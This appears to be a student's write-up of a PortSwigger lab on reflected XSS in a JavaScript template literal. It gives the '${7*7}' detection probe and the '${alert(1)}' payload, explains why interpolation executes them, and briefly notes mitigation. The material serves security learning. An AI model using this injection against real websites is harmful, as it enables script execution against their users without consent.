# Lab23 - Reflected XSS Into A JavaScript Template Literal

## Objective

Exploit a reflected XSS vulnerability where user input is reflected inside a JavaScript template literal.

Execute:

```javascript
alert(1)
```

to solve the lab.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Reflected XSS |
| Difficulty | Practitioner |
| Context | Template Literal |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application places user input inside:

```javascript
`
`
```

(backticks).

Example:

```javascript
var message = `USER_INPUT`;
```

---

# Analysis

## Step 1

Search:

```text
carry123
```

---

## Step 2

Inspect source.

Observation:

```javascript
var message = `carry123`;
```

---

## Step 3

Determine Context

Input reflected inside:

```javascript
Template Literal
```

---

## Step 4

Look For Interpolation

Template literals support:

```javascript
${expression}
```

---

# Full Payload(s) Used

## Detection

```javascript
${7*7}
```

---

Expected Result:

```text
49
```

---

## Final Payload

```javascript
${alert(1)}
```

---

# Why The Payload Works

Original:

```javascript
var message = `USER_INPUT`;
```

---

Injected:

```javascript
var message = `${alert(1)}`;
```

---

Execution Flow

```text
Template Literal
        ↓
Expression Evaluation
        ↓
alert(1)
```

---

# Personal Analysis & Testing Process

## Initial Goal

Identify whether:

```javascript
`
`
```

(backticks) are used.

---

## Observation

Input reflected inside template literal.

---

## Verification

Tested:

```javascript
${7*7}
```

---

Output:

```text
49
```

confirmed interpolation.

---

## Exploitation

Used:

```javascript
${alert(1)}
```

---

## Result

```javascript
alert(1)
```

executed.

Lab solved.

---

# Mitigation

Never place untrusted input inside template literals.

Use safe encoding or sanitization.

---

# Related Theory

- 29-xss-in-javascript-template-literals.md

---

# Key Learnings

- Template literals introduce unique XSS vectors.
- No quote breakout required.
- Always test:

```javascript
${7*7}
```

when backticks are present.